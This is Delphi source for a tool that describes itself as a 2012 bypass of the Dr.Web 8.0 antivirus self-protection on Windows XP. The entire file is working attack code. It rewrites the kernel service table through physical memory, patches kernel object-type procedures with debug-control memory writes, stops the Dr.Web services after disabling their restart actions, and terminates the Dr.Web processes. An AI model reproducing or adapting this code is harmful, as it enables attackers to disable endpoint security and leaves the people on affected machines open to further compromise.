{$E EXE}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}
{$IFDEF minimum}
program Spidie;
{$ENDIF}
unit Spidie;
interface

uses
  Windows, WinNative, ObjList2, Loader, LDasm, RTL, Ring0;

implementation

type
  _SERVICE_DESCRIPTOR_ENTRY = record
    ServiceTableBase: PPVOID;
    ServiceCounterTableBase: PPVOID; //Used only in checked build
    NumberOfServices: DWORD;
    ParamTableBase: PBYTE;
  end;
  SERVICE_DESCRIPTOR_ENTRY = _SERVICE_DESCRIPTOR_ENTRY;
  PSERVICE_DESCRIPTOR_ENTRY = ^_SERVICE_DESCRIPTOR_ENTRY;

  _DWBUF = array[0..0] of DWORD;
  DWBUF = _DWBUF;
  PDWBUF = ^_DWBUF;

  _SYSINFO_BUFFER = record
    Count: ULONG;
    ModInfo: array[0..0] of SYSTEM_MODULE_INFORMATION;
  end;
  SYSINFO_BUFFER = _SYSINFO_BUFFER;
  PSYSINFO_BUFFER = ^_SYSINFO_BUFFER;

var
  pntkernel: PVOID;
  PsProcessType: OBJECT_TYPE;
  CmKeyTypeInit: OBJECT_TYPE_INITIALIZER;
  CmpKeyObjectType: OBJECT_TYPE;
  KernelSize: DWORD;
  KernelBase, pOriginalSDT: PVOID;
  MmSystemRangeStart: Cardinal;
  CmpKeyObjectTypeAddress: PVOID;
  
const
  IMAGE_ORDINAL_FLAG32 = $80000000;
  WINXP_SDT_ENTRIES_COUNT = 284;

  cm2600_7600: array[0..6] of BYTE = ($C7, $45, $B4, $3F, $00, $0F, $00); //C7 45 B4 3F 00 0F 00
  cmpobject_2600: array[0..9] of BYTE = ($57, $8D, $45, $E0, $50, $FF, $75, $DC, $FF, $35);
  DrWebProcessesMax = 5;
  DrWebProcesses: array[0..DrWebProcessesMax] of PWideChar = (
    'spideragent.exe', 'dwengine.exe', 'dwscanner.exe', 'dwarkdaemon.exe', 'dwnetfilter.exe', 'dwservice.exe');
  KeServiceDescriptorTable: PAnsiChar = 'KeServiceDescriptorTable';
  NtFlushKeyStr: PAnsiChar = 'NtFlushKey';
  SpiDiE_Msg: PWideChar = 'meow';

function FindOrigSDT(const pKernel: pointer; kernelBase: DWORD): DWORD;
var
  t: DWORD;
  p1: PChar;
begin
  result := 0;
  t := DWORD(FastGetProcAddress(HINST(pKernel), KeServiceDescriptorTable)) - DWORD(pKernel);
  p1 := pKernel;
  repeat
    if ((PWORD(p1)^ = $05C7) and (PDWORD(p1 + 2)^ = t + kernelBase)) then
    begin
      result := PDWORD(p1 + 6)^ - kernelBase;
      break;
    end;
    inc(p1);
  until false;
end;

function GetKeServiceDescriptorTable(fPtr: PChar): PVOID;
var
  c: DWORD;
begin
  for c := 0 to 4095 do
    if (PWORD(fPtr + c)^ = $888D) then
    begin
      result := PPVOID(fPtr + c + 2)^;
      exit;
    end;
  result := nil;
end;

procedure GetCmKeyObjectInitializer(pObjectBody: POBJECT_TYPE_INITIALIZER; const KernelBaseAddress: DWORD); stdcall;
var
  RawSize, x, y: DWORD;
  RawData, p1: PChar;
  i, Length: integer;
  dos_header: ^IMAGE_DOS_HEADER;
  pe_headers: PPE_HEADER_BLOCK;
  u: integer;
  Mov_OpCode1: BYTE;
  bFound: boolean;

  function CheckSignature(var signsize: dword): BOOLEAN;
  var
    c: integer;
  begin
    result := true;
    signsize := 7;
    for c := 0 to 6 do
      if (cm2600_7600[c] <> PBYTE(RawData + c)^) then
      begin
        result := false;
        break;
      end;
  end;

begin
  p1 := pntkernel;
  dos_header := pointer(p1);
  pe_headers := pointer(p1 + dos_header^._lfanew);
  Mov_OpCode1 := $D0;

  bFound := false;
  for u := 0 to pe_headers^.FileHeader.NumberOfSections - 1 do
  begin
    if bFound then break;
    RawData := pointer(p1 + pe_headers^.Sections[u].PointerToRawData);
    RawSize := pe_headers^.Sections[u].SizeOfRawData - 12;
    x := 0;
    while (RawSize > 512) do
    begin
      if CheckSignature(x) then
      begin
        inc(RawData, x);
        dec(RawSize, x);
        Length := SizeOfProc(Pointer(RawData));

        for i := 0 to Length do
        begin
          if (PBYTE(RawData + i)^ = $C7)
            and (PBYTE(RawData + i + 1)^ = $45)
            and (PBYTE(RawData + i + 2)^ = Mov_OpCode1) then
          //mov [ebp+var_30],
          begin
            y := 3;
            x := PULONG(RawData + i + y)^;

            x := x - KernelBaseAddress;
            pObjectBody^.CloseProcedure := pointer(KernelBaseAddress + x); //CmpCloseKeyObject

            x := SizeOfCode(Pointer(RawData + i), nil);
            if (x = 0) then inc(x);
            inc(y, x);
            x := PULONG(RawData + i + y)^;
            x := x - KernelBaseAddress;
            pObjectBody^.DeleteProcedure := pointer(KernelBaseAddress + x); //CmpDeleteKeyObject

            x := SizeOfCode(Pointer(RawData + i), nil);
            if (x = 0) then inc(x);
            inc(y, x);
            x := PULONG(RawData + i + y)^;
            x := x - KernelBaseAddress;
            pObjectBody^.ParseProcedure := pointer(KernelBaseAddress + x); //CmpParseKey

            bFound := true;
            break;
          end;
        end;
        if bFound then break;
      end;
      inc(RawData);
      dec(RawSize);
    end;
  end;
end;

function GetCmpKeyObjectTypeAddress(KernelBaseAddress: DWORD): PVOID;
var
  RawSize, x: DWORD;
  RawData, p1: PChar;
  dos_header: ^IMAGE_DOS_HEADER;
  pe_headers: PPE_HEADER_BLOCK;
  u: integer;
  bFound: boolean;

  function CheckSignature(var signsize: dword): BOOLEAN;
  var
    c: integer;
  begin
    result := true;
    signsize := 10;
    for c := 0 to 9 do
      if (cmpobject_2600[c] <> PBYTE(RawData + c)^) then
      begin
        result := false;
        break;
      end;
  end;

begin
  p1 := pntkernel;
  dos_header := pointer(p1);
  pe_headers := pointer(p1 + dos_header^._lfanew);
  result := nil;
  bFound := false;
  for u := 0 to pe_headers^.FileHeader.NumberOfSections - 1 do
  begin
    if bFound then break;
    RawData := pointer(p1 + pe_headers^.Sections[u].PointerToRawData);
    RawSize := pe_headers^.Sections[u].SizeOfRawData - 12;
    x := 0;
    while (RawSize > 512) do
    begin
      if CheckSignature(x) then
      begin
        inc(RawData, x);
        x := PULONG(RawData)^;
        result := pointer(x);
        break;
      end;
      inc(RawData);
      dec(RawSize);
    end;
  end;

end;

var
  textbuf: LBuf;

procedure GetOriginalSystemState();
var
  psdt: PVOID;
  p1: PChar;
  modinf: SYSINFO_BUFFER;
  KernelBaseAddress, bytesIO: ULONG;
  pe_headers: PPE_HEADER_BLOCK;
  dos_header: ^IMAGE_DOS_HEADER;
begin
  bytesIO := 0;
  ZwQuerySystemInformation(SystemModuleInformation, @modinf, sizeof(SYSINFO_BUFFER), @bytesIO);
  if (bytesIO = 0) then exit;
  strcpyW(textbuf, KI_SHARED_USER_DATA.NtSystemRoot);
  strcatW(textbuf, '\system32\');
  RtlAnsiToUnicode(strendW(textbuf), @modinf.ModInfo[0].ImageName[modinf.ModInfo[0].ModuleNameOffset]);
  KernelBase := modinf.ModInfo[0].Base;
  pntkernel := PELdrLoadLibrary(textbuf, nil, modinf.ModInfo[0].Base);
  if (pntkernel <> nil) then
  begin
    KernelSize := PEGetVirtualSize(pntkernel);
    psdt := PChar(pntkernel) + FindOrigSDT(pntkernel, DWORD(modinf.ModInfo[0].Base));
    pOriginalSDT := nil;
    bytesIO := WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD);
    ZwAllocateVirtualMemory(NtCurrentProcess, @pOriginalSDT, 0, @bytesIO, MEM_COMMIT or MEM_TOP_DOWN, PAGE_READWRITE);
    memcopy(pOriginalSDT, psdt, WINXP_SDT_ENTRIES_COUNT * sizeof(DWORD));

    memzero(@CmKeyTypeInit, sizeof(OBJECT_TYPE_INITIALIZER));

    p1 := pntkernel;
    dos_header := pntkernel;
    pe_headers := pointer(p1 + dos_header^._lfanew);
    KernelBaseAddress := (DWORD(KernelBase) - pe_headers^.OptionalHeader.ImageBase);

    //get original parseprocedure
    GetCmKeyObjectInitializer(@CmKeyTypeInit, KernelBaseAddress);
    CmpKeyObjectTypeAddress := GetCmpKeyObjectTypeAddress(DWORD(KernelBase));
  end;
end;

procedure StopService(hscm: SC_HANDLE; ServiceName: PWideChar);
var
  Actions: SERVICE_FAILURE_ACTIONSW;
  Action: SC_ACTION;
  service1: SERVICE_STATUS;
  hsrv: SC_HANDLE;
begin
  hsrv := OpenServiceW(hscm, ServiceName, SERVICE_ALL_ACCESS);
  if (hsrv <> 0) then
  begin
    Actions.dwResetPeriod := 100;
    Actions.lpRebootMsg := nil;
    Actions.lpCommand := nil;
    Actions.cActions := 1;
    Actions.lpsaActions := @Action;
    Action._Type := SC_ACTION_NONE;
    Action.Delay := 0;
    ChangeServiceConfig2W(hsrv, SERVICE_CONFIG_FAILURE_ACTIONS, @Actions);
    ControlService(hsrv, SERVICE_CONTROL_STOP, @service1);
    CloseServiceHandle(hsrv);
  end;
end;

procedure DisableDwEngine();
var
  hscm: SC_HANDLE;
begin
  hscm := OpenSCManagerW(nil, nil, SC_MANAGER_ALL_ACCESS);
  if (hscm <> 0) then
  begin
    StopService(hscm, 'drwebengine');
    StopService(hscm, 'drwebavservice');
    StopService(hscm, 'drwebnetfilter');
    CloseServiceHandle(hscm);
  end;
end;

function MapPhysMem(hPhyMem: THANDLE; PhyAddr: PDWORD; Length: PDWORD; VirtAddress: PPVOID): PVOID; stdcall;
var
  ViewBase: LARGE_INTEGER;
begin
  VirtAddress^ := nil;
  ViewBase.LowPart := 0;
  ViewBase.HighPart := 0;
  ViewBase.QuadPart := int64(PhyAddr^);
  ZwMapViewOfSection(hPhyMem, NtCurrentProcess, VirtAddress, 0, Length^, @viewBase, Length, ViewShare, 0, PAGE_READWRITE);
  PhyAddr^ := DWORD(viewBase.LowPart);
  result := pointer(viewBase.LowPart);
end;

procedure UnmapPhysMem(VirtualAddr: PVOID);
begin
  ZwUnmapViewOfSection(NtCurrentProcess, VirtualAddr);
end;

function RemoveDwProtHooks(): boolean;
var
  start: DWORD;
  serviceTable: PDWBUF;
  len, wantedAddr: DWORD;
  ptr, pAddr: PChar;
  hPhysMem: THANDLE;
  p1, sdtAddr: PVOID;
  bytesIO: ULONG;
  Status: NTSTATUS;
  rv: MEMORY_CHUNKS;
  serviceTableAddress: ULONG;
  entries: array[0..3] of SERVICE_DESCRIPTOR_ENTRY;
begin
  result := false;
  GetOriginalSystemState();

  sdtAddr := FastGetProcAddress(HINST(pntkernel), KeServiceDescriptorTable);
  p1 := PChar(sdtAddr) - DWORD(pntkernel) + DWORD(KernelBase) - sizeof(entries);

  if (p1 <> nil) then
  begin
    memzero(@entries, sizeof(entries));
    rv.Address := p1;
    rv.Data := @entries;
    rv.Length := sizeof(entries);
    Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
    if (Status = STATUS_SUCCESS) then
    begin
      hPhysMem := OpenPhysicalMemory(SECTION_MAP_READ or SECTION_MAP_WRITE);
      if (hPhysMem <> 0) then
      begin
        serviceTableAddress := DWORD(entries[0].ServiceTableBase);
        pAddr := PChar(serviceTableAddress) - MmSystemRangeStart;
        wantedAddr := ULONG(pAddr);
        len := PAGE_SIZE;
        if (MapPhysMem(hPhysMem, @pAddr, @len, @ptr) <> nil) then
        begin
          start := wantedAddr - ULONG(pAddr);
          serviceTable := @ptr[start];
          memcopy(serviceTable, pOriginalSDT, sizeof(DWORD) * entries[0].NumberOfServices);
          UnMapPhysMem(ptr);
        end;
        ZwClose(hPhysMem);
      end;

      //Unhook PsProcessType
      memzero(@PsProcessType, sizeof(OBJECT_TYPE));
      p1 := PChar(FastGetProcAddress(HINST(pntkernel), 'PsProcessType')) - DWORD(pntkernel) + DWORD(KernelBase);
      rv.Address := p1;
      rv.Data := @p1;
      rv.Length := sizeof(DWORD);
      Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
      if (Status = STATUS_SUCCESS) then
      begin
        rv.Address := p1;
        rv.Data := @PsProcessType;
        rv.Length := sizeof(OBJECT_TYPE);
        Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
        if (Status = STATUS_SUCCESS) then
        begin
          bytesIO := 0;
          rv.Address := pointer(DWORD(p1) + $90); //OpenProcedure removal
          rv.Data := @bytesIO;
          rv.Length := sizeof(DWORD);
          Status := ZwSystemDebugControl(DbgWriteVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
          result := (Status = STATUS_SUCCESS);
        end;
      end;

      //Unhook CmKeyType
      if (CmpKeyObjectTypeAddress <> nil) then
      begin
        rv.Address := CmpKeyObjectTypeAddress;
        rv.Data := @p1;
        rv.Length := sizeof(DWORD);
        Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
        if (Status = STATUS_SUCCESS) then
        begin
          rv.Address := p1;
          rv.Data := @CmpKeyObjectType;
          rv.Length := sizeof(OBJECT_TYPE);
          Status := ZwSystemDebugControl(DbgReadVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
          if (Status = STATUS_SUCCESS) then
          begin
            rv.Address := pointer(DWORD(p1) + $9C); //ParseProcedure removal
            rv.Data := @CmKeyTypeInit.ParseProcedure;
            rv.Length := sizeof(DWORD);
            Status := ZwSystemDebugControl(DbgWriteVirtualMemory, @rv, sizeof(MEMORY_CHUNKS), nil, 0, @bytesIO);
            result := (Status = STATUS_SUCCESS);
          end;
        end;
      end;
    end;
  end;
  if (pOriginalSDT <> nil) then
  begin
    bytesIO := 0;
    ZwFreeVirtualMemory(THANDLE(-1), @pOriginalSDT, @bytesIO, MEM_RELEASE);
  end;
end;

function ShowMessage(PStr: PWideChar; Buttons: DWORD): DWORD; stdcall;
begin
  result := MessageBoxW(GetDesktopWindow(), PStr, SpiDiE_Msg, Buttons);
end;

function KillProcess(ProcessId: Cardinal; ExitCode: DWORD = $BADC0DE): boolean; stdcall;
var
  f: THANDLE;
  attr: OBJECT_ATTRIBUTES;
  cid1: CLIENT_ID;
begin
  result := false;
  cid1.UniqueProcess := ProcessId;
  cid1.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0, nil);
  f := 0;
  if (ZwOpenProcess(@f, PROCESS_ALL_ACCESS, @attr, @cid1) = STATUS_SUCCESS) then
    if (f <> 0) then
    begin
      result := (ZwTerminateProcess(f, ExitCode) = STATUS_SUCCESS);
      ZwClose(f);
    end;
end;

procedure FindAndKillDwEngine();
var
  pp1: PSYSTEM_PROCESSES;
  membuf: PChar;
  bytesIO: DWORD;
  i: integer;
  buf: LBuf;
begin
  membuf := nil;
  bytesIO := $400000;
  ZwAllocateVirtualMemory(NtCurrentProcess, @membuf, 0, @bytesIO, MEM_COMMIT, PAGE_READWRITE);
  if (membuf = nil) then exit;
  if (ZwQuerySystemInformation(SystemProcessesAndThreadsInformation, membuf, bytesIO, @bytesIO) = STATUS_SUCCESS) then
  begin
    pp1 := PSYSTEM_PROCESSES(membuf);
    while (1 = 1) do
    begin
      memzero(@buf, sizeof(LBuf));
      if (pp1^.ProcessName.PStr <> nil) then
        for i := 0 to DrWebProcessesMax do
          if (strcmpiW(pp1^.ProcessName.PStr, DrWebProcesses[i]) = 0) then
            KillProcess(pp1^.ProcessId, 0);

      if (pp1^.NextEntryOffset = 0) then break;
      pp1 := PSYSTEM_PROCESSES(PChar(pp1) + pp1^.NextEntryOffset);
    end;
  end;
  bytesIO := 0;
  ZwFreeVirtualMemory(NtCurrentProcess, @membuf, @bytesIO, MEM_RELEASE);
end;

function DrWebIsRunning(): BOOLEAN; stdcall;
var
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  id1: THANDLE;
begin
  result := false;
  RtlInitUnicodeString(@str1, '\??\DwProt');
  InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
  if (ZwOpenSymbolicLinkObject(@id1, SYMBOLIC_LINK_QUERY, @attr) = STATUS_SUCCESS) then
  begin
    result := true;
    ZwClose(id1);
  end;
end;

procedure main();
begin
  if (DrWebIsRunning()) then
  begin
    if (RemoveDwProtHooks()) then
    begin
      DisableDwEngine();
      FindAndKillDwEngine();
    end;
  end else
    ShowMessage('Dr.Web not found', MB_OK);
end;

var
  osver: OSVERSIONINFOEXW;
  sysinfo: SYSTEM_BASIC_INFORMATION;
  bytesIO: DWORD;
begin
  osver.old.dwOSVersionInfoSize := sizeof(osver.old);
  RtlGetVersion(@osver);
  if (osver.old.dwBuildNumber = 2600) then
  begin
   ShowMessage('dwprot 8.0.0.11010 bypass by rin, Nov 2012'#13#10#13#10 +
    'Based on EP_X0FF''s SpiDiE v1.5 from 2009'#13#10 +
    'Bypassing of all Dr.Web 8.0 SP in one click :)', MB_OK);

    if (Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE) = STATUS_SUCCESS) then
    begin
      if (ZwQuerySystemInformation(SystemBasicInformation, @sysinfo, sizeof(SYSTEM_BASIC_INFORMATION), nil) = STATUS_SUCCESS) then
      begin
        MmSystemRangeStart := 1 + sysinfo.HighestUserAddress div $100000;
        MmSystemRangeStart := MmSystemRangeStart * $100000;
      end else MmSystemRangeStart := $80000000;

      main();

      ShowMessage('Bye (^.^)', MB_OK);

      bytesIO := 0;
      ZwFreeVirtualMemory(NtCurrentProcess, @pntkernel, @bytesIO, MEM_RELEASE);
    end;
  end;
  ZwTerminateProcess(DWORD(-1), 0);
end.

